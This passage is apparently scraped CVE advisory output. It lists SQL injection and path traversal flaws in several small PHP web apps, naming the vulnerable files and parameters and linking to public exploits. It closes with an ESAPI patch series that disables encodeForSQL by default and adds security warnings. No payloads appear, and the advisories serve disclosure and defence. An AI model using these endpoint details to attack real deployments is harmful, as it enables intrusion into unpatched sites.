  1. https://github.com/ez-lbz/poc/issues/24 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://vuldb.com/?ctiid.314340 [Permissions Required, Third Party Advisory, VDB Entry]
  3. https://vuldb.com/?id.314340 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603638 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/ez-lbz/poc/issues/24 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314340 ---
id

================================================================================


CVE ID: CVE-2025-6867
Published: 2025-06-29T19:15:22.187
Modified: 2025-07-08T14:38:01.107
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Simple Company Website 1.0 and classified as critical. This issue affects some unknown processing of the file /admin/services/manage.php. The manipulation of the argument ID leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/ez-lbz/poc/issues/23 [Exploit, Issue Tracking]
  2. https://vuldb.com/?ctiid.314339 [Permissions Required, Third Party Advisory, VDB Entry]
  3. https://vuldb.com/?id.314339 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603637 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/ez-lbz/poc/issues/23 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314339 ---
id

================================================================================


CVE ID: CVE-2025-6866
Published: 2025-06-29T18:15:21.020
Modified: 2025-07-01T12:14:15.277
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability has been found in code-projects Simple Forum 1.0 and classified as critical. This vulnerability affects unknown code of the file /forum_downloadfile.php. The manipulation of the argument filename leads to path traversal. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/22 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314338 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314338 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603581 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/22 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314338 ---
filename

================================================================================


CVE ID: CVE-2025-6863
Published: 2025-06-29T15:15:30.550
Modified: 2025-07-01T12:58:01.017
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in PHPGurukul Local Services Search Engine Management System 2.1. Affected by this vulnerability is an unknown functionality of the file /admin/edit-category-detail.php. The manipulation of the argument editid leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/louis-zly/myCVE/issues/1 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314335 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314335 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603386 [Third Party Advisory, VDB Entry]
  6. https://github.com/louis-zly/myCVE/issues/1 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314335 ---
editid

================================================================================


CVE ID: CVE-2025-6862
Published: 2025-06-29T15:15:29.510
Modified: 2025-07-01T13:07:05.527
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in SourceCodester Best Salon Management System 1.0. Affected is an unknown function of the file /panel/edit_plan.php. The manipulation of the argument editid leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-14.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314334 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314334 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603378 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-14.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314334 ---
editid

================================================================================


CVE ID: CVE-2025-6861
Published: 2025-06-29T14:15:21.617
Modified: 2025-07-01T13:13:44.863
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Best Salon Management System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /panel/add_plan.php. The manipulation of the argument plan_name/description/duration_days/price leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-13.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314333 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314333 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603375 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-13.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314333 ---
plan_name/description/duration_days/price

================================================================================


CVE ID: CVE-2025-6860
Published: 2025-06-29T13:15:24.617
Modified: 2025-07-01T13:30:43.580
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Best Salon Management System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /panel/staff_commision.php. The manipulation of the argument fromdate/todate leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-12.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314332 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314332 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603374 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-12.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314332 ---
fromdate/todate

================================================================================


CVE ID: CVE-2025-6859
Published: 2025-06-29T13:15:23.577
Modified: 2025-07-08T14:38:13.577
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Best Salon Management System 1.0. It has been classified as critical. This affects an unknown part of the file /panel/pro_sale.php. The manipulation of the argument fromdate/todate leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-11.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314331 [Permissions Required]
  3. https://vuldb.com/?id.314331 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603373 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314331 ---
fromdate/todate

================================================================================


CVE ID: CVE-2025-5878
Published: 2025-06-29T12:15:23.633
Modified: 2025-06-30T18:38:23.493
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-20: Improper Input Validation
  - CWE-138: CWE-138

Description:
A vulnerability was found in ESAPI esapi-java-legacy and classified as problematic. This issue affects the interface Encoder.encodeForSQL of the SQL Injection Defense. An attack leads to an improper neutralization of special elements. The attack may be initiated remotely and an exploit has been disclosed to the public. The project was contacted early about this issue and handled it with an exceptional level of professionalism. Upgrading to version 2.7.0.0 is able to address this issue. Commit ID f75ac2c2647a81d2cfbdc9c899f8719c240ed512 is disabling the feature by default and any attempt to use it will trigger a warning. And commit ID e2322914304d9b1c52523ff24be495b7832f6a56 is updating the misleading Java class documentation to warn about the risks.

References (9):
  1. https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin13.pdf
  2. https://github.com/ESAPI/esapi-java-legacy/commit/e2322914304d9b1c52523ff24be495b7832f6a56
  3. https://github.com/ESAPI/esapi-java-legacy/commit/f75ac2c2647a81d2cfbdc9c899f8719c240ed512
  4. https://github.com/ESAPI/esapi-java-legacy/releases/tag/esapi-2.7.0.0
  5. https://github.com/uglory-gll/javasec/blob/main/ESAPI.md
  6. https://vuldb.com/?ctiid.314321
  7. https://vuldb.com/?id.314321
  8. https://vuldb.com/?submit.590149
  9. https://vuldb.com/?submit.590150

Attempting to extract code examples from references...

--- Code from https://github.com/ESAPI/esapi-java-legacy/commit/e2322914304d9b1c52523ff24be495b7832f6a56 ---
From 849c15e4ceb0821625f81a04e3274865e6a299a3 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Sun, 8 Jun 2025 23:24:00 -0400
Subject: [PATCH 01/14] Sdd comment about doclint options.

---
 pom.xml | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/pom.xml b/pom.xml
index 8c954c6bd..e69d57aa4 100644
--- a/pom.xml
+++ b/pom.xml
@@ -643,7 +643,7 @@
                 <version>3.11.2</version>
                <configuration>
                  <source>8</source>
-                 <doclint>none</doclint>
+                 <doclint>none</doclint>    <!-- none, missing, simple, or all -->
                </configuration>
                <!-- generate esapi-VERSION.javadoc.jar -->
                <executions>

From 40026bfc9212a83ad4f2400144b4a5f2531e1472 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Sun, 8 Jun 2025 23:25:42 -0400
Subject: [PATCH 02/14] Add 2 properties associated w/ disabling stuff by
 default.

---
 src/test/resources/esapi/ESAPI.properties | 34 +++++++++++++++++++++++
 1 file changed, 34 insertions(+)

diff --git a/src/test/resources/esapi/ESAPI.properties b/src/test/resources/esapi/ESAPI.properties
index 8ffc61f66..1007597f5 100644
--- a/src/test/resources/esapi/ESAPI.properties
+++ b/src/test/resources/esapi/ESAPI.properties
@@ -578,3 +578,37 @@ Validator.AcceptLenientDates=false
 #
 #Validator.HtmlValidationAction=clean
 Validator.HtmlValidationAction=throw
+
+########################################################################################
+# The following methods are now disabled in the default configuration and must
+# be explicity enabled. If you try to invoke a method disabled by default, ESAPI
+# will thrown a NotConfiguredByDefaultException.
+#
+# The reason for this varies, but ranges from they are not really suitable for
+# enterprise scale to that are only marginally tested (if at all) versus the are
+# unsafe for general use, although them may be fine when combined with other
+# security-in-depth techiques.
+#
+# The disabled-by-default methods are:
+#   org.owasp.esapi.reference.DefaultEncoder.encodeForSQL
+#   org.owasp.esapi.ESAPI.accessController  [FUTURE]
+#
+# The format is a comma-separated list of fully,Qualified.ClassNames.methodName
+#
+#   Note to ESAPI Devs: There is presently no way to specific which specific
+#                       method to indicate here when the method name alone,
+#                       absent from its signature, is ambiguous, so it is
+#                       best to avoid those if at all possible!
+#
+#                       An example of that would be something like:
+#                           org.owasp.esapi.reference.DefaultValidator.getValidPrintable
+#                       which has 4 interfaces so currently, there's no way to
+#                       specify a specific one.
+#       
+ESAPI.enableLegCannonModeAndGetMyAssFired.methodNames=org.owasp.esapi.reference.DefaultEncoder.encodeForSQL
+
+# Normally you would put some text here (that will be logged) that provides some
+# justification as to why you have enabled these functions. This can be
+# anythuing such as a Jira or ServiceNow ticket number, a security exception
+# reference, etc. If it is left empty, it will just like "Justification: none".`
+ESAPI.enableLegCannonModeAndGetMyAssFired.justification=blah,blah. Please don't fire my @$$. Ticket # 12345

From 436fee51465d04400bf13ab5fd447a92474ce6ff Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Sun, 8 Jun 2025 23:29:59 -0400
Subject: [PATCH 03/14] Class for new unchecked exception type.

---
 .../NotConfiguredByDefaultException.java      | 31 +++++++++++++++++++
 1 file changed, 31 insertions(+)
 create mode 100644 src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java

diff --git a/src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java b/src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java
new file mode 100644
index 000000000..fb624e75c
--- /dev/null
+++ b/src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java
@@ -0,0 +1,31 @@
+package org.owasp.esapi.errors;
+
+/**
+ * A {@code NotConfiguredByDefaultException} should be thrown when a method that
+ * is disabled by default is invoked,
+ * </p><p>
+ * See the ESAPI properties "ESAPI.enableLegCannonModeAndGetMyAssFired.methodNames" and
+ * "ESAPI,enableLegCannonModeAndGetMyAssFired,justification" in the
+ * <b>ESAPI.properties</b> file for additional details.
+ * </p>
+ */
+public class NotConfiguredByDefaultException extends ConfigurationException {
+
+    protected static final long serialVersionUID = 1L;
+
+    public NotConfiguredByDefaultException(Exception e) {
+        super(e);
+    }
+
+    public NotConfiguredByDefaultException(String s) {
+        super(s);
+    }
+
+    public NotConfiguredByDefaultException(String s, Throwable cause) {
+        super(s, cause);
+    }
+
+    public NotConfiguredByDefaultException(Throwable cause) {
+        super(cause);
+    }
+}

From 1da613b79246814906647799e9694037fe2332c8 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Sun, 8 Jun 2025 23:31:13 -0400
Subject: [PATCH 04/14] Miscellaneous Javadoc enhancements.

---
 src/main/java/org/owasp/esapi/Encoder.java    | 96 +++++++++++++++----
 .../java/org/owasp/esapi/codecs/Codec.java    | 12 +++
 .../java/org/owasp/esapi/codecs/DB2Codec.java | 11 ++-
 .../org/owasp/esapi/codecs/MySQLCodec.java    | 37 ++++---
 .../org/owasp/esapi/codecs/OracleCodec.java   | 14 ++-
 5 files changed, 131 insertions(+), 39 deletions(-)

diff --git a/src/main/java/org/owasp/esapi/Encoder.java b/src/main/java/org/owasp/esapi/Encoder.java
index ad4950dc9..d4e7656a3 100644
--- a/src/main/java/org/owasp/esapi/Encoder.java
+++ b/src/main/java/org/owasp/esapi/Encoder.java
@@ -96,7 +96,7 @@
  * stores some untrusted data item such as an email address from a user. A
  * developer thinks "let's output encode this and store the encoded data in
  * the database, thus making the untrusted data safe to use all the time, thus
-* saving all of us developers all the encoding troubles later on". On the surface,
+ * saving all of us developers all the encoding troubles later on". On the surface,
  * that sounds like a reasonable approach. The problem is how to know what
  * output encoding to use, not only for now, but for all possible <i>future</i>
  * uses? It might be that the current application code base is only using it in
@@ -147,10 +147,28 @@
  * target="_blank" rel="noopener noreferrer">ESAPI Encoder JUnittest cases</a> for ideas.
  * If you are really ambitious, an excellent resource for XSS attack patterns is
  * <a href="https://beefproject.com/" target="_blank" rel="noopener noreferrer">BeEF - The Browser Exploitation Framework Project</a>.
+ * </li><li><b>A final note on {@code Encoder} implementation details:</b>
+ * Most of the {@code Encoder} methods make extensive use of ESAPI's {@link org.owasp.esapi.codecs.Codec}
+ * classes under-the-hood. These {@code Codec} classes are intended for use for encoding and decoding
+ * input based on some particular context or specification.  While the OWASP team
+ * over the years have made every effort to be cautious--often going to extremes
+ * to make "safe harbor" decisions on harmful inputs other similar encoders assume are already safe
+ * (we did this to in order to protect the client's users from buggy browsers that don't adhere
+ * to the W3C HTML specications)&em;the various {@code Codec} implemtations can offer
+ * NO GUARANTEE of safety of the content being encoded or decoded. Therefore,
+ * it is highly advised to practice a security-in-depth approach for everything you do.
+ * By following that advise, you will minimize the impact and/or likelihood of any
+ * vulnerabilities from bugs in the ESAPI code or accidental misuse of the ESAPI
+ * library on your part. In particular, whenever there are cases where cients use
+ * any of these {@link org.owasp.esapi.codecs.Codec} classes drectly, it is highly
+ * recommended to perform canonicalization followed by strict input valiation both
+ * prior to encoding and after decoding to protect your application from input-based
+ * attacks.
  * </li>
  * </ul>
- *
+ * </p>
  * @see <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cross-Site Scripting Prevention Cheat Sheet</a>
+ * @see org.owasp.esapi.Validator
  * @see <a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">OWASP Proactive Controls: C4: Encode and Escape Data</a>
  * @see <a href="https://www.onwebsecurity.com/security/properly-encoding-and-escaping-for-the-web.html" target="_blank" rel="noopener noreferrer">Properly encoding and escaping for the web</a>
  * @author Jeff Williams (jeff.williams .at. owasp.org)
@@ -215,7 +233,7 @@ public interface Encoder {
      * <ul><li>Perverse but legal variants of escaping schemes</li>
      * <li>Multiple escaping (%2526 or &#x26;lt;)</li>
      * <li>Mixed escaping (%26lt;)</li>
-     * <li>Nested escaping (%%316 or &%6ct;)</li>
+     * <li>Nested escaping (%%316 or &amp;%6ct;)</li>
      * <li>All combinations of multiple, mixed, and nested encoding/escaping (%2&#x35;3c or &#x2526gt;)</li></ul>
      * <p>
      * Using canonicalize is simple. The default is just...
@@ -395,25 +413,69 @@ public interface Encoder {
 
     /**
      * Encode input for use in a SQL query, according to the selected codec
-     * (appropriate codecs include the MySQLCodec and OracleCodec).
-     *
-     * This method is not recommended. The use of the {@code PreparedStatement}
-     * interface is the preferred approach. However, if for some reason
-     * this is impossible, then this method is provided as a weaker
-     * alternative.
-     *
-     * The best approach is to make sure any single-quotes are double-quoted.
-     * Another possible approach is to use the {escape} syntax described in the
-     * JDBC specification in section 1.5.6.
-     *
+     * (appropriate codecs include the {@link org.owasp.esapi.codecs.MySQLCodec}
+     * and {@link org.owasp.esapi.codecs.OracleCodec}), but see
+     * "<b>SECURITY WARNING</b>" below before using.
+     * <p>
+     * The this method attempts to ensure make sure any single-quotes are double-quoted
+     * (i.e., as '', not double-quotes, as in &quot;). Another possible approach
+     * is to use the {escape} syntax described in the JDBC specification in section 1.5.6.
      * However, this syntax does not work with all drivers, and requires
      * modification of all queries.
-     *
+     * </p><p>
+     * <b>SECURITY WARNING:</b> This method is <u>NOT</u> recommended. The use of the {@code PreparedStatement}
+     * interface is the preferred approach. However, if for some reason
+     * this is impossible, then this method is provided as significantly weaker
+     * alternative. In particular, it should be noted that if all you do to
+     * address potential SQL Injection attacks is to use this method to escape
+     * parameters, you <i>will</i> fail miserably. According to the
+     * <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">
+     * OWASP SQL Injection Prevention Cheat Sheet</a>, these are the primary
+     * defenses against SQL Injection (as of June 2025):
+     * <ul>
+     * <li>Option 1: Use of Prepared Statements (with Parameterized Queries)</li>
+     * <li>Option 2: Use of Properly Constructed Stored Procedures</li>
+     * <li>Option 3: Allow-list Input Validation</li>
+     * <li>Option 4: STRONGLY DISCOURAGED: Escaping All User Supplied Input</li>
+     * </ul>
+     * </p><p>
+     * According to "Option 4" (which is what this method implements), that OWASP Cheat Sheet
+     * states:
+     * <blockquote
+     * cite="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-4-strongly-discouraged-escaping-all-user-supplied-input">
+     * In this approach, the developer will escape all user input
+     * before putting it in a query. It is very database specific
+     * in its implementation. This methodology is frail compared
+     * to other defenses, and <b>we <i>CANNOT</i> guarantee that this option
+     * will prevent all SQL injections in all situations.</b>
+     * </blockquote>
+     * (Emphasis ours.)
+     * </p><p>
+     * Note you could give yourself a slightly better chance at success if prior to
+     * escaping by this method, you first canonicalize the input and run it through
+     * some strong allow-list validation. We will not provide anymore details than
+     * that, lest we encourage its misuse; however, it should be noted that resorting
+     * to use this method--especially by itself--should rarely, if ever, used. It
+     * is intended as a last ditch, emergency, Hail Mary effort. (To be honest, you'd
+     * likely have more success setting up a WAF such as
+     * <a href="https://modsecurity.org/">OWASP ModSecurity</a> and
+     * <a href="https://owasp.org/www-project-modsecurity-core-rule-set/">OWASP CRS</a>
+     * if you need a temporary emergency SQLi defense shield, but using {@code PreparedStatement}
+     * is still your best option if you have the time and resources.
+     * </p><p>
+     * <b>Note to AppSec / Security Auditor teams:</b> If see this method being used in
+     * application code, the risk of an exploitable SQLi vulnerability is still high. We
+     * stress the importance of the first two Options discussed in the
+     * <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">
+     * OWASP SQL Injection Prevention Cheat Sheet</a>. If you allow this, we recommend only
+     * doing so for a limited time duration and in the meantime creating some sort of security
+     * exception ticket to track it.
+     * </p>
      * @see <a href="https://download.oracle.com/otn-pub/jcp/jdbc-4_2-mrel2-spec/jdbc4.2-fr-spec.pdf">JDBC Specification</a>
      * @see <a href="https://docs.oracle.com/javase/8/docs/api/java/sql/PreparedStatement.html">java.sql.PreparedStatement</a>
      *
      * @param codec
-     *      a Codec that declares which database 'input' is being encoded for (ie. MySQL, Oracle, etc.)
+     *      a {@link org.owasp.esapi.codecs.Codec} that declares which database 'input' is being encoded for (ie. MySQL, Oracle, etc.)
      * @param input
      *      the text to encode for SQL
      *
@@ -526,7 +588,7 @@ public interface Encoder {
      * For more information, refer to <a
      * href="http://www.ibm.com/developerworks/xml/library/x-xpathinjection.html">this
      * article</a> which specifies the following list of characters as the most
-     * dangerous: ^&"*';<>(). <a
+     * dangerous: ^ & " * ' ; < > ( ) . <a
      * href="http://www.packetstormsecurity.org/papers/bypass/Blind_XPath_Injection_20040518.pdf">This
      * paper</a> suggests disallowing ' and " in queries.
      *
diff --git a/src/main/java/org/owasp/esapi/codecs/Codec.java b/src/main/java/org/owasp/esapi/codecs/Codec.java
index 52c49c1e2..80eb914ca 100644
--- a/src/main/java/org/owasp/esapi/codecs/Codec.java
+++ b/src/main/java/org/owasp/esapi/codecs/Codec.java
@@ -22,6 +22,17 @@
  * and canonicalization.  The design of these codecs allows for character-by-character decoding, which is
  * necessary to detect double-encoding and the use of multiple encoding schemes, both of which are techniques
  * used by attackers to bypass validation and bury encoded attacks in data.
+ * </p><p>
+ * Other than the interfaces, very few of these concrete classes are intended to be used directly.
+ * Rather, most of them are used through implementations of the {@link org.owasp.esapi.Encoder}
+ * interface. While the OWASP team over the years have made every effort to be extra cautious, the
+ * various {@code Codec} implemtations can offer NO GUARANTEE of safety if the client is
+ * using these {@code Codec} classes <i>directly</i>. Therefore, if the client is using
+ * these classes directly, it is highly advised to practice security-in-depth
+ * and also perform canonicalization, followed by strict input valiation, both
+ * prior to encoding and after decoding, to protect your application from input-based
+ * attacks.
+ * </p>
  *
  * @author Jeff Williams (jeff.williams .at. aspectsecurity.com) <a
  *         href="http://www.aspectsecurity.com">Aspect Security</a>
@@ -30,6 +41,7 @@
  * @author Matt Seil (mseil .at. owasp.org)
  * @since June 1, 2017
  * @see org.owasp.esapi.Encoder
+ * @see org.owasp.esapi.Validator
  */
 public interface Codec<T> {
     /**
diff --git a/src/main/java/org/owasp/esapi/codecs/DB2Codec.java b/src/main/java/org/owasp/esapi/codecs/DB2Codec.java
index 8df61bc34..979d35ae1 100644
--- a/src/main/java/org/owasp/esapi/codecs/DB2Codec.java
+++ b/src/main/java/org/owasp/esapi/codecs/DB2Codec.java
@@ -14,7 +14,14 @@
 
 
 /**
- * Implementation of the Codec interface for DB2 strings. This function will only protect you from SQLi in limited situations.
+ * Implementation of the Codec interface for IBM Db2 strings.
+ * This function will only protect you from SQLi in limited situations.
+ * To improve your changces of success, you made also need to do some
+ * additional canonicalization and input validation first. Before using this class,
+ * pleaes be sure to read the "SECURITY WARNING" in
+ * {@link org.owasp.esapi.Encoder#encodeForSQL}
+ * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of find
+ * a silver bullet to kill all the SQLi werewolves.
  *
  * @author Sivasankar Tanakala (stanakal@TRS.NYC.NY.US)
  * @since October 26, 2010
@@ -65,4 +72,4 @@ public Character decodeCharacter(PushbackString input) {
 
         return (Character.valueOf('\''));
     }
-}
\ No newline at end of file
+}
diff --git a/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java b/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java
index c507b0362..a1938ef24 100644
--- a/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java
+++ b/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java
@@ -19,9 +19,16 @@
 
 /**
  * Codec implementation which can be used to escape string literals in MySQL.
- * </br>
- * Implementation accepts 2 Modes as identified by the OWASP Recommended
- * escaping strategies:
+ * This function will only protect you from SQLi in limited situations.
+ * To improve your changces of success, you made also need to do some
+ * additional canonicalization and input validation first. Before using this class,
+ * pleaes be sure to read the "SECURITY WARNING" in
+ * {@link org.owasp.esapi.Encoder#encodeForSQL}
+ * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of find
+ * a silver bullet to kill all the SQLi werewolves.
+ * </p><p>
+ * This implementation accepts 2 {@code org.owasp.esapi.codes.MySQLCodec.Mode}s as identified
+ * by the OWASP recommended escaping strategies:
  * <ul>
  * <li><b>ANSI</b> <br>
  * Simply encode all ' (single tick) characters with '' (two single ticks)</li>
@@ -29,19 +36,19 @@
  * <li><b>Standard</b>
  *
  * <pre>
- *   NUL (0x00) --> \0  [This is a zero, not the letter O]
- *   BS  (0x08) --> \b
- *   TAB (0x09) --> \t
- *   LF  (0x0a) --> \n
- *   CR  (0x0d) --> \r
- *   SUB (0x1a) --> \Z
- *   "   (0x22) --> \"
- *   %   (0x25) --> \%
- *   '   (0x27) --> \'
- *   \   (0x5c) --> \\
- *   _   (0x5f) --> \_
+ *   NUL (0x00) --&gt; \0  [This is a zero, not the letter O]
+ *   BS  (0x08) --&gt; \b
+ *   TAB (0x09) --&gt; \t
+ *   LF  (0x0a) --&gt; \n
+ *   CR  (0x0d) --&gt; \r
+ *   SUB (0x1a) --&gt; \Z
+ *   "   (0x22) --&gt; \"
+ *   %   (0x25) --&gt; \%
+ *   '   (0x27) --&gt; \'
+ *   \   (0x5c) --&gt; \\
+ *   _   (0x5f) --&gt; \_
  *   <br>
- *   all other non-alphanumeric characters with ASCII values less than 256  --> \c
+ *   all other non-alphanumeric characters with ASCII values less than 256 --&gt; \c
  *   where 'c' is the original non-alphanumeric character.
  * </pre>
  *
diff --git a/src/main/java/org/owasp/esapi/codecs/OracleCodec.java b/src/main/java/org/owasp/esapi/codecs/OracleCodec.java
index eb91a07ce..d12f6f650 100644
--- a/src/main/java/org/owasp/esapi/codecs/OracleCodec.java
+++ b/src/main/java/org/owasp/esapi/codecs/OracleCodec.java
@@ -18,10 +18,14 @@
 
 
 /**
- * Implementation of the Codec interface for Oracle strings. This function will only protect you from SQLi in the case of user data
- * bring placed within an Oracle quoted string such as:
- *
- * select * from table where user_name='  USERDATA    ';
+ * Implementation of the {@link org.owasp.esapi.codecs.Codec} interface for Oracle DB strings. 
+ * This function will only protect you from SQLi in limited situations.
+ * To improve your changces of success, you made also need to do some
+ * additional canonicalization and input validation first. Before using this class,
+ * pleaes be sure to read the "SECURITY WARNING" in
+ * {@link org.owasp.esapi.Encoder#encodeForSQL}
+ * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of find
+ * a silver bullet to kill all the SQLi werewolves.
  *
  * @see <a href="http://oraqa.com/2006/03/20/how-to-escape-single-quotes-in-strings/">how-to-escape-single-quotes-in-strings</a>
  *
@@ -87,4 +91,4 @@ public Character decodeCharacter( PushbackSequence<Character> input ) {
         return( Character.valueOf( '\'' ) );
     }
 
-}
\ No newline at end of file
+}

From 2d444b903d59a851fb0805f17f04342deecf9269 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Mon, 9 Jun 2025 15:06:03 -0400
Subject: [PATCH 05/14] Fix Javadoc typos. Shout-out to @sempf for spotting
 most of these.

---
 src/main/java/org/owasp/esapi/Encoder.java            | 2 +-
